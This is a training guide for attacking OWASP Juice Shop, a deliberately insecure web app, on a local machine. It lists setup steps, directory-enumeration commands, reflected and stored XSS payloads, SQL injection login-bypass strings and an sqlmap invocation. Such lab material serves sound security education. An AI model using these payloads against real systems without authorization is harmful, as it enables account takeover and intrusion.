# OWASP Juice Shop - Systematic Attack Guide

## Overview
OWASP Juice Shop is a deliberately insecure web application designed for security training, awareness demonstrations, and Capture The Flag (CTF) events. It encompasses vulnerabilities from the OWASP Top 10 and other real-world security flaws, making it an ideal platform for learning web application security testing techniques.

## Key Features
- Covers OWASP Top 10 and additional security vulnerabilities
- Gamified Score Board with challenges ranging from Level 1 to Level 6
- Wide range of vulnerability categories (SQL Injection, XSS, Broken Authentication, etc.)
- Detailed companion guide with hints and solutions
- Multiple deployment options (Docker, Node.js, cloud platforms)
- Self-contained learning environment

## Setup Instructions

### Docker Installation (Recommended)
```bash
# Pull the official Docker image
docker pull bkimminich/juice-shop

# Run the container
docker run -d -p 3000:3000 bkimminich/juice-shop
```

### Alternative Setup Methods
- **Node.js**: Clone from GitHub, run `npm install` and `npm start`
- **Vagrant**: Use provided Vagrant configuration for VM setup
- **Cloud Deployment**: AWS, Azure, and Google Cloud scripts available

**System Requirements**:
| Requirement | Minimum | Recommended |
|-------------|---------|-------------|
| RAM         | 256 MB  | 384 MB      |
| CPU         | 200 millicpu | 400 millicpu |
| Disk Space  | 300 MB  | 800 MB      |

## Initial Exploration Strategy

### Find the Score Board
Your first objective is discovering the hidden Score Board that lists all challenges:
```bash
# Use directory enumeration
dirsearch -u http://localhost:3000 -e html,php,js

# Or try common paths manually
http://localhost:3000/score-board
http://localhost:3000/scoreboard
```

### Browser-Based Discovery
- View page source (`Ctrl+U`) to find hidden endpoints
- Use JavaScript console (F12) to analyze scripts
- Look for commented-out sections or administrative links

## Challenge Categories & Levels

The challenges are organized into these main categories:
- **Injection** (SQL Injection, XXE, etc.)
- **Broken Authentication** (Login bypasses, session management)
- **Sensitive Data Exposure** (Information disclosure)
- **XML External Entities (XXE)**
- **Broken Access Control** (Authorization bypasses)
- **Security Misconfiguration**
- **Cross-Site Scripting (XSS)** (Reflected, Stored, DOM-based)
- **Insecure Deserialization**
- **Vulnerable Components**
- **Security Through Obscurity**

### Level Progression
| Level | Difficulty | Example Challenges |
|-------|------------|-------------------|
| 1     | Beginner   | Score Board discovery, Basic XSS |
| 2     | Easy       | SQL Injection login bypass |
| 3     | Medium     | API-based attacks, File uploads |
| 4     | Hard       | Advanced injection techniques |
| 5     | Expert     | Complex multi-step attacks |
| 6     | Master     | Sophisticated exploitation chains |

## Sample Attack Techniques

### Level 1 Examples
**Score Board Discovery**:
```bash
# Using dirb
dirb http://localhost:3000 /usr/share/dirb/wordlists/common.txt

# Manual navigation
# Try: /score-board, /admin, /administration
```

**Basic XSS (Reflected)**:
```html
<!-- In search field -->
<iframe src="javascript:alert('xss')">
<script>alert('XSS')</script>
```

### Level 2 Examples
**SQL Injection Login Bypass**:
```sql
-- Username field
admin'--
' OR 1=1 --
1=1 --

-- Email field for admin login
admin@juice-sh.op'--
```

### Level 3+ Examples
**API-based XSS**:
```bash
# POST request to products API
curl -X POST http://localhost:3000/api/Products \
  -H "Content-Type: application/json" \
  -d '{"name": "XSS Product", "description": "<iframe src=\"javascript:alert('xss')\">", "price": 47.11}'
```

## Systematic Approach

### Phase 1: Reconnaissance
1. Access the application at `http://localhost:3000`
2. Explore all visible features and pages
3. View source code and JavaScript files
4. Find the Score Board to see all available challenges

### Phase 2: Easy Wins (Level 1-2)
1. Start with basic challenges to build confidence
2. Focus on obvious vulnerabilities (simple XSS, directory traversal)
3. Use browser developer tools extensively
4. Document successful techniques for reuse

### Phase 3: Intermediate Challenges (Level 3-4)
1. Leverage proxy tools (Burp Suite, OWASP ZAP)
2. Intercept and modify API requests
3. Explore file upload and download functionalities
4. Test for advanced injection techniques

### Phase 4: Advanced Exploitation (Level 5-6)
1. Chain multiple vulnerabilities together
2. Exploit complex business logic flaws
3. Use advanced payloads and encoding techniques
4. Focus on sophisticated attack vectors

## Tools Integration

### Web Proxies
```bash
# Configure Burp Suite proxy
# Browser proxy: 127.0.0.1:8080
# Intercept requests to analyze application behavior
```

### Directory Enumeration
```bash
# Gobuster
gobuster dir -u http://localhost:3000 -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Dirb
dirb http://localhost:3000 /usr/share/dirb/wordlists/common.txt
```

### SQL Injection Testing
```bash
# SQLMap (use with caution)
sqlmap -u "http://localhost:3000/rest/user/login" --data="email=test&password=test" --batch
```

## Progress Tracking

The Score Board provides:
- Challenge completion status
- Difficulty ratings (1-6 stars)
- Vulnerability category organization
- Progress percentage
- Hints for stuck challenges

## Learning Resources

### Official Documentation
- **Companion Guide**: [Pwning OWASP Juice Shop](https://leanpub.com/juice-shop)
- **Project Homepage**: [OWASP Juice Shop Official](https://owasp.org/www-project-juice-shop/)
- **GitHub Repository**: [Source Code and Issues](https://github.com/juice-shop/juice-shop)

### Community Resources
- **Beginner's Guide**: [Null Byte Tutorial](https://null-byte.wonderhowto.com/how-to/beginners-guide-owasp-juice-shop-your-practice-hacking-grounds-for-10-most-common-web-app-vulnerabilities-0185103/)
- **Detailed Writeups**: Various security blogs and CTF writeups
- **Video Tutorials**: YouTube channels covering specific challenges

## Best Practices

### Learning Approach
- Attempt challenges independently before consulting hints
- Focus on understanding vulnerability mechanics, not just solutions
- Take detailed notes on successful exploitation techniques
- Practice explaining findings as if reporting to a client

### Tool Usage
- Start with manual testing before using automated tools
- Use browser developer tools extensively
- Leverage proxy tools for request modification
- Combine multiple tools for comprehensive testing

### Documentation
- Screenshot important findings
- Document successful payloads and techniques
- Create a personal methodology based on successful approaches
- Track time spent on different challenge types

## Common Pitfalls to Avoid

- Don't rely solely on automated tools
- Avoid jumping straight to high-level challenges
- Don't ignore the hints system when genuinely stuck
- Resist the urge to look up solutions immediately

## Advanced Usage

### CTF Events
The application can be configured for competitive events with:
- Team-based scoring
- Time-limited challenges
- Custom branding and themes
- Integration with CTF platforms

### Training Programs
Use for structured security training with:
- Progressive difficulty curves
- Specific vulnerability focus areas
- Assessment and certification tracking
- Instructor-led workshops

**Disclaimer**: OWASP Juice Shop is designed for educational purposes. Always ensure you have explicit permission before applying learned techniques to any systems you do not own. Unauthorized testing is illegal and unethical. 